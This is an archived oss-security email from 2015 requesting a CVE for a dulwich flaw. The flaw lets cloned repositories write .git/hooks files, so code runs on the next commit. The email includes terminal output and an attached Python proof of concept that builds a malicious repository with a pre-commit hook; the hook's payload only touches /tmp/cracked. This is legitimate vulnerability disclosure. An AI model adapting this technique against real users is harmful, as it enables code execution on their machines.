X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2573" "Saturday" "21" "March" "2015" "10:26:24" "+0100" "Salvatore Bonaccorso" "carnil@debian.org" "<20150321092624.GA10087@eldamar.local>" "91" "[oss-security] Possible CVE Request: dulwich: does not prevent to write files in commits with invalid paths to working tree" nil nil nil "3" "2015032109:26:24" "[oss-security] Possible CVE Request: dulwich: does not prevent to write files in commits with invalid paths to working tree" (number mark "        carnil@debia Mar 21   91/2573  " thread-indent "\"[oss-security] Possible CVE Request: dulwich: does not prevent to write files in commits with invalid paths to working tree\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 30020 invoked by uid 550); 21 Mar 2015 09:26:37 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 30002 invoked from network); 21 Mar 2015 09:26:37 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=sender:date:from:to:cc:subject:message-id:mime-version:content-type
         :content-disposition:user-agent;
        bh=TBRckhHQ9Uvum8vZviLURHU6GvJd/vU2z5BNICT3Nkw=;
        b=iKPKJdDzeVWkJsdHCz4QfJ+ioqhdeXchiL+5koquRAzTpsgaxEHaKnrMn/BTlqc9xK
         JLp9elWWR6hdLqN19b0oWXKq9SvWYrhde5OrXeLa6kRA9x+yEzlJK76utjc1AMJyhGQx
         CD25NGOI+BOjL1myEqqYuHNVkN1PUrqhpKFrYVxYlWDD7mb+dMSY2ofVDYvOCqnPJ4aS
         fIqrfAi8Z8UM8a+rMGHLyZBDKq3vDI53lh+9Tbe/b7jNm2dixDUNIDCuRDUBXL4dKYTg
         FHe2S6L5MS8RKGvFZRFkrLI8tpA/JLNJYIehd5uquScuzb9V6o5JmxQxz79kOv7lribw
         O2yw==
X-Received: by 10.180.7.196 with SMTP id l4mr3098897wia.44.1426929985762;
        Sat, 21 Mar 2015 02:26:25 -0700 (PDT)
Message-ID: <20150321092624.GA10087@eldamar.local>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="envbJBWh7q8WU6mo"
Content-Disposition: inline
User-Agent: Mutt/1.5.23 (2014-03-12)
Cc: CVE Assignments MITRE <cve-assign@mitre.org>,
	Jelmer Vernooij <jelmer@debian.org>
Date: Sat, 21 Mar 2015 10:26:24 +0100
From: Salvatore Bonaccorso <carnil@debian.org>
Reply-To: oss-security@lists.openwall.com
Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
Subject: [oss-security] Possible CVE Request: dulwich: does not prevent to write files in
 commits with invalid paths to working tree
To: OSS Security Mailinglist <oss-security@lists.openwall.com>

--envbJBWh7q8WU6mo
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi,

While looking at CVE-2014-9390 I noticed
https://lists.launchpad.net/dulwich-users/msg00827.html for dulwich reported by
Gary van der Merwe. Does the scope of CVE-2014-9390 also include these bits
from the above:

dulwich happily clones a repository which contains commit with invalid
paths, say .git/hooks/pre-commit, and thus allowing execution of code
on subsequent commits.

----cut---------cut---------cut---------cut---------cut---------cut-----
dummy@sid:~$ python PoC.py 
dummy@sid:~$ dulwich clone PoC.git foo
Counting objects: 5, done.
Compressing objects: 100% (2/2), done.
Total 5 (delta 0), reused 5 (delta 0)
Checking out HEADdummy@sid:~$ cd foo/
dummy@sid:~/foo$ git commit -m "test" --allow-empty
You just got cracked! (not really but you could have been!)
[master 9588153] test
dummy@sid:~/foo$ ls -l /tmp/cracked 
-rw-r--r-- 1 dummy dummy 0 Mar 21 10:24 /tmp/cracked
dummy@sid:~/foo$
----cut---------cut---------cut---------cut---------cut---------cut-----

Upstream (Jelmer Vernooij) has fixed this with commit

https://git.samba.org/?p=jelmer/dulwich.git;a=commitdiff;h=091638be3c89f46f42c3b1d57dc1504af5729176

Does this need a separate CVE from CVE-2014-9390? 

Regards,
Salvatore

--envbJBWh7q8WU6mo
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="PoC.py"

#!/usr/bin/env python2

import os
import time

from dulwich.repo import Repo
from dulwich.objects import Blob, Tree, Commit,  parse_timezone

repo_dir = 'PoC.git'
os.mkdir(repo_dir)
repo = Repo.init_bare(repo_dir)

evil_file = Blob.from_string("""#!/usr/bin/env python
import subprocess
subprocess.call(["/bin/touch", "/tmp/cracked"])
print('You just got cracked! (not really but you could have been!)')
""")

hooks_tree = Tree()
hooks_tree.add('pre-commit', 0o100755, evil_file.id)

git_tree = Tree()
git_tree.add('hooks', 0o40000, hooks_tree.id)

root_tree = Tree()
root_tree.add('.git', 0o40000, git_tree.id)

commit = Commit()
commit.tree = root_tree.id
author = "Dr. Evil <drevil@xxxxxxxxxxx>"
commit.author = commit.committer = author
commit.commit_time = commit.author_time = int(time.time())
tz = parse_timezone('-0200')[0]
commit.commit_timezone = commit.author_timezone = tz
commit.encoding = "UTF-8"
commit.message = "Evil commit"

repo.object_store.add_objects([
    (evil_file, None),
    (hooks_tree, None),
    (git_tree, None),
    (root_tree, None),
    (commit, None),
])

repo.refs['refs/heads/master'] = commit.id

--envbJBWh7q8WU6mo--
